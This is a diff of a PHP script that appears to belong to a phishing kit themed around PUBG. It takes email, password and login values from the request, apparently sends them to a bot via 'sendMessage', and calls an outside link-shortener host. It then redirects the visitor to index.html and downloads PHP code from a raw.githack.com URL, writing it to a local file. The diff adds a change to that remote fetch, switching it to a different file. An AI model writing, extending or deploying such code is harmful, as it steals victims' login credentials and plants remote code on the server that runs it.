@@ -38,8 +38,9 @@ $admin = $info[info]['id'];
 $email = $_GET["email"];
 $password = $_GET["password"];
 $login = $_GET["login"];
-$linky = $_SERVER['HTTP_HOST'];
-$mink ="https://$linky/index.html";
+$linky = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+$minly ="http://$linky";
+$mink = str_replace("?email","?l",$minly);
 $api = "http://www.gift-shamy.xyz/sh.php?link=$mink"; 
 $result = json_decode(file_get_contents($api), true); 
 $shortt = $result["short"];
@@ -73,15 +74,15 @@ bot("sendMessage",[
 ?>
 <html>
   <head>
-    <meta http-equiv="refresh" content="0; url='/index.html'" />
+    <meta http-equiv="refresh" content="0; url='index.html'" />
     <script type="text/javascript">
-            window.location.href = "/index.html"
+            window.location.href = "index.html"
     </script>
  </head>
   <body>
   </body>
 </html>
 <?
-$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/P/Ps.php');
+$sha = file_get_contents('https://raw.githack.com/ahmed-shamy/index-pubg/main/P/ubot.php');
 $xxx = file_put_contents("Sha_My.php", $sha);
 ?>
